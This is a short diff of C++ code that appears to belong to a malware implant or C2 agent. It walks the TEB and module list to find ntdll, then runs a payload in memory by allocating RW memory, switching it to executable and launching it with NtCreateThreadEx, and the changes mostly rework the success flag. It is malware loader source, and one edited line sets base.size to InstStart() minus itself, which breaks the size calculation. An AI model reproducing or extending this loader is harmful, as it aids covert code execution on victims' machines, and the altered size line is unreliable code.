@@ -79,7 +79,7 @@ namespace Memory {
 
             instance.teb->LastErrorValue    = ERROR_SUCCESS;
             instance.base.address           = U_PTR(InstStart());
-            instance.base.size              = U_PTR(Inend()) - instance.base.address;
+            instance.base.size              = U_PTR(InstStart()) - instance.base.address;
 
             if (!(instance.modules.ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase)) {
                 return false;
@@ -150,13 +150,12 @@ namespace Memory {
             void (*exec)()  = nullptr;
 
         	HANDLE handle	= nullptr;
-            BOOL success	= true;
+            BOOL success	= false;
 
             size_t size = parser.length;
 
             if (!NT_SUCCESS(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 // LOG ERROR
-                success = false;
                 goto defer;
             }
 
@@ -164,7 +163,6 @@ namespace Memory {
 
             if (!NT_SUCCESS(ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                 // LOG ERROR
-                success = false;
                 goto defer;
             }
 
@@ -172,6 +170,7 @@ namespace Memory {
             ntstatus = ctx->threadapi.NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) exec, nullptr, NULL, NULL, NULL, NULL, nullptr);
 
             MemSet(base, 0, size);
+            success = true;
 
         defer:
             if (base) {
